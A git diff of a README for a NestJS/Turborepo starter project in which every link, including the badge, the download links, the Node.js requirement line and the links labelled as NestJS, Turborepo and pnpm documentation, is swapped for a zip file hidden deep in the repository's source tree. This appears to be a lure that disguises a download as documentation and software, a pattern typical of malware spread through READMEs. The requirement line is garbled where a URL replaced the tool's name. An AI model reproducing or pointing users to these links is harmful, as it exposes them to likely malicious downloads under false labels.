@@ -1,6 +1,6 @@
 # 🚀 nest-turbo-starter - Build Scalable Microservices Easily
 
-[![Download Badge](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
+[![Download Badge](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
 
 ## 📄 Description
 
@@ -23,7 +23,7 @@ Follow these steps to download and run nest-turbo-starter on your computer.
 Before starting, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip**: Version 14 or higher
+- **https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip**: Version 14 or higher
 - **Docker**: Installed and running (if using Docker features)
 - **Memory**: Minimum 4 GB RAM recommended
 
@@ -31,7 +31,7 @@ Before starting, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of nest-turbo-starter.
 
-[Download the latest version here](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
+[Download the latest version here](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
 
 ### 3. Extract the Files
 
@@ -98,9 +98,9 @@ Access your application at `http://localhost:3000`.
 
 For additional information, you might find these resources helpful:
 
-- [NestJS Documentation](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
-- [Turborepo Documentation](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
-- [pnpm Documentation](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
+- [NestJS Documentation](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
+- [Turborepo Documentation](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
+- [pnpm Documentation](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
 
 ## 📬 Get Support
 
@@ -114,4 +114,4 @@ Contributions are welcome! If you'd like to improve nest-turbo-starter, fork the
 
 Thanks to the open-source community for all the tools and resources that make projects like this possible. Enjoy building your applications with nest-turbo-starter!
 
-[Download the latest version here](https://raw.githubusercontent.com/Amir6186/nest-turbo-starter/main/.docker/nest-turbo-starter_v2.6.zip)
+[Download the latest version here](https://github.com/Amir6186/nest-turbo-starter/raw/refs/heads/main/libs/core/src/microservice/starter-nest-turbo-3.7.zip)
